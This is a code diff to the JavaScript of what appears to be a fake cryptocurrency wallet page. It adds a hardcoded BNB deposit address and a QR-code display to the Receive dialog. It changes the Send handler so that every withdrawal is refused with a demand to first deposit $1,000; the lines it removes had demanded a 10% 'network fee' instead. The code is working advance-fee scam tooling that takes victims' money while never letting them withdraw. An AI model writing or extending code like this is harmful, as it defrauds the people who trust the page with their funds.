@@ -742,8 +742,10 @@ receiveBtn.addEventListener('click', () => {
     actionModalTitle.textContent = 'Receive Crypto';
     sendForm.style.display = 'none';
     receiveForm.style.display = 'block';
-    // Set initial address for BTC
-    walletAddressDisplay.textContent = walletAddresses['BTC'];
+    // Set initial address for BNB
+    walletAddressDisplay.textContent = walletAddresses['BNB'];
+    receiveCurrencySelect.value = 'BNB';
+    generateQR('BNB');
     actionModal.classList.add('show');
 });
 
@@ -790,13 +792,9 @@ sendSubmitBtn.addEventListener('click', () => {
         return;
     }
 
-    // Calculate network fee (10% of withdrawal amount)
-    const withdrawalAmount = parseFloat(amount);
-    const networkFee = withdrawalAmount * 0.1;
-
     // Show deposit requirement message inside the wallet
     const sendMessage = document.getElementById('send-message');
-    sendMessage.textContent = `To withdraw $${withdrawalAmount.toFixed(2)} ${currency}, you need to deposit a network fee of $${networkFee.toFixed(2)} first.`;
+    sendMessage.textContent = 'You need to add $1,000 to your balance before you can be able to do any transaction.';
     sendMessage.style.display = 'block';
 
     // Show OK button
@@ -820,6 +818,7 @@ const walletAddresses = {
     'BTC': 'bc1qg9rtnx87ha4flmm4295mwj9j3m8aztpalty8za',
     'ETH': '0x695ef4038416D42cC267Fe767816963f7A528379',
     'USDT': '0x695ef4038416D42cC267Fe767816963f7A528379',
+    'BNB': '0x8EAebFccc5831876387D79b8Ca6208b691A0DD4F',
     'TUSD': '0x8EAebFccc5831876387D79b8Ca6208b691A0DD4F',
     'USDC': '0x8EAebFccc5831876387D79b8Ca6208b691A0DD4F'
 };
@@ -877,6 +876,22 @@ function formatNumberWithCommas(num) {
 async function fetchLivePrices() {
     // This would fetch from CoinGecko API in a real implementation
     return null;
+}
+
+// Generate QR code for wallet address using pre-generated images
+function generateQR(coin) {
+    const qrContainer = document.getElementById('qr-code-container');
+    qrContainer.innerHTML = ''; // Clear previous QR code
+
+    const img = document.createElement('img');
+    img.src = `${coin}_qr.png`;
+    img.alt = `${coin} QR Code`;
+    img.style.width = '128px';
+    img.style.height = '128px';
+    img.style.display = 'block';
+    img.style.margin = '0 auto';
+
+    qrContainer.appendChild(img);
 }
 
 
